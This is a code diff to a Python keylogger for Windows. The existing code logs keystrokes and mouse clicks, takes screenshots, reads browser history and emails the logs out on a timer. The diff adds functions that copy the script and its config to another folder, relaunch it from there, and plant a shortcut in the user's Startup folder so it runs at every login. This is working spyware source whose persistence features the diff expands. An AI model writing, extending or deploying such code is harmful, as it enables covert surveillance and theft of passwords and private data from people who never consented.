@@ -1,4 +1,4 @@
-import os, json, win32api, traceback
+import os, sys, json, shutil, win32api, traceback
 from time import sleep
 from threading import Timer
 from pynput import keyboard, mouse # Keylogger
@@ -6,11 +6,7 @@ from PIL.ImageGrab import grab as screenshot # Screenshots
 import sqlite3 # Browser history
 import smtplib, ssl # Email
 from email.message import EmailMessage # Email
-
-
-
-CONFIG = {}
-LOGS_PATHNAMES = set()
+import win32com.client # Startup shortcut
 
 
 
@@ -33,8 +29,6 @@ def set_interval(fun, sec: int, wait=True):
 
 
 
-last_click = None
-
 # Writes a string to the keylog file
 def keylog_write_string(string: str):
     #print(string, end="")
@@ -46,7 +40,7 @@ def keylog_write_string(string: str):
         f.write(string)
 
     if (string == "[QUIT]"):
-        raise os._exit(0)
+        exit()
 
 # Writes a key press to the keylog file
 def keylog_write_key(key: keyboard.Key):
@@ -202,16 +196,87 @@ def send_configured_email():
 
 
 
+# Get self file path
+def get_self_filepath():
+    cwd_filepath_exe = os.path.join(os.getcwd(), os.path.basename(sys.executable))
+    cwd_filepath_py = os.path.join(os.getcwd(), os.path.basename(__file__))
+
+    if (os.path.exists(cwd_filepath_exe)):
+        return cwd_filepath_exe
+    if (os.path.exists(cwd_filepath_py)):
+        return cwd_filepath_py
+    else:
+        return __file__
+
 # Load config
 def load_config():
-    with open("config.json") as f:
-        global CONFIG
-        CONFIG = json.load(f)
+    def selective_merge(base_obj, delta_obj):
+        if not isinstance(base_obj, dict):
+            return delta_obj
+        common_keys = set(base_obj).intersection(delta_obj)
+        new_keys = set(delta_obj).difference(common_keys)
+        for k in common_keys:
+            base_obj[k] = selective_merge(base_obj[k], delta_obj[k])
+        for k in new_keys:
+            base_obj[k] = delta_obj[k]
+        return base_obj
+
+    DEFAULT_CONFIG_PATHNAME = "config-default.json"
+    if (os.path.exists(DEFAULT_CONFIG_PATHNAME) == False):
+        DEFAULT_CONFIG_PATHNAME = os.path.join(sys._MEIPASS, DEFAULT_CONFIG_PATHNAME)
+
+    with open(DEFAULT_CONFIG_PATHNAME) as f:
+        DEFAULT_CONFIG = json.load(f)
+
+    DELTA_CONFIG = {}
+    if (os.path.exists("config.json")):
+        with open("config.json") as f:
+            DELTA_CONFIG = json.load(f)
+
+    global CONFIG
+    CONFIG = selective_merge(DEFAULT_CONFIG, DELTA_CONFIG)
+
+# Copy script and config to a location and run it
+def execute_script_elsewhere():
+    MOVE_LOCATION = os.path.expandvars(CONFIG["copy_location"])
+
+    if (MOVE_LOCATION != ""):
+        if (os.path.exists(MOVE_LOCATION) == False):
+            os.mkdir(MOVE_LOCATION)
+
+        if (os.path.samefile(MOVE_LOCATION, os.getcwd()) == False):
+            shutil.copy(SELF_FILEPATH, MOVE_LOCATION)
+            if (os.path.exists("config.json")):
+                shutil.copy("config.json", MOVE_LOCATION)
+            if (os.path.exists("config-default.json")):
+                shutil.copy("config-default.json", MOVE_LOCATION)
+
+            os.chdir(MOVE_LOCATION)
+            os.startfile(os.path.basename(SELF_FILEPATH))
+
+            return True
+
+    return False
+
+# Create shortcut to script in startup folder
+def create_startup_shortcut():
+    def create_shortcut(target, location):
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortCut(location)
+        shortcut.IconLocation = target
+        shortcut.Targetpath = target
+        shortcut.WorkingDirectory = os.path.dirname(target)
+        shortcut.save()
+
+    if (CONFIG["create_startup_shortcut"]):
+        STARTUP_FOLDER = os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        create_shortcut(SELF_FILEPATH, os.path.join(STARTUP_FOLDER, os.path.basename(SELF_FILEPATH) + ".lnk"))
 
 # Start logging
 def start_logging():
-    if (os.path.exists(CONFIG["logs_location"]) == False):
-        os.mkdir(CONFIG["logs_location"])
+    LOGS_LOCATION = os.path.expandvars(CONFIG["logs_location"])
+    if (os.path.exists(LOGS_LOCATION) == False):
+        os.mkdir(LOGS_LOCATION)
 
     if (CONFIG["keylogger"]["enabled"]):
         keyboard.Listener(on_press=keylog_write_key).start()
@@ -228,11 +293,27 @@ def start_logging():
     if (CONFIG["email"]["enabled"]):
         set_interval(send_configured_email, CONFIG["email"]["interval"])
 
+# Exit script immediately
+def exit():
+    os._exit(0)
 
 
-# Main
+
 try:
+    SELF_FILEPATH = get_self_filepath()
+    CONFIG = {}
+    LOGS_PATHNAMES = set()
+
+    last_click = None
+
+
     load_config()
+
+    if (execute_script_elsewhere()):
+        exit()
+
+    create_startup_shortcut()
+
     start_logging()
 
     # Keep the script running
@@ -240,11 +321,11 @@ try:
         sleep(3600)
 except:
     try:
-        ERROR_LOG_PATHNAME = os.path.join(".", "error.txt")
-
-        with open(ERROR_LOG_PATHNAME, "w+") as f:
+        with open(os.path.join(".", "error.txt"), "w+") as f:
             f.write(traceback.format_exc())
+
+        exit()
     except:
         pass
 
-os._exit(0)
+exit()
